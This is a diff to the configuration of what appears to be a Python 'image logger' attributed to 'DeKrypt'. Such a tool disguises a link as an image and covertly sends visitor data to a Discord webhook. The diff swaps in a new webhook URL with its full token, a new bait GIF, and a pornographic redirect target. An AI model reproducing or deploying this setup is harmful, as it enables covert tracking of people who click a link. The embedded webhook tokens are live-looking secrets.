@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1473070680508727389/Z4P1t3R2vSGs0Zte_sGprU9vkfRV649fw5yWDoBnxyseHi14UlfvNovhXpEKzyjOhDIs",
-    "image": "https://media.tenor.com/NAU5DQazc8EAAAAe/middleclick-middleclick-for-calculator.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1536144365158924288/bva5yMUxKlO_USYIzwhbtSqNhDBdzd83Zs6HA1MEFeDd-hwF9vAdIDAPv_K_yJUW8AJcs",
+    "image": "https://cdn.discordapp.com/attachments/1384931896005361806/1384931978389749780/d993b34fbd30cdfd-1.gif?ex=6a79fb6a&is=6a78a9ea&hm=104148d402b2b28862161253eb92995cf2151eb4eacf4bdbcb949f365c22f028&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://rt.pornhub.com" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
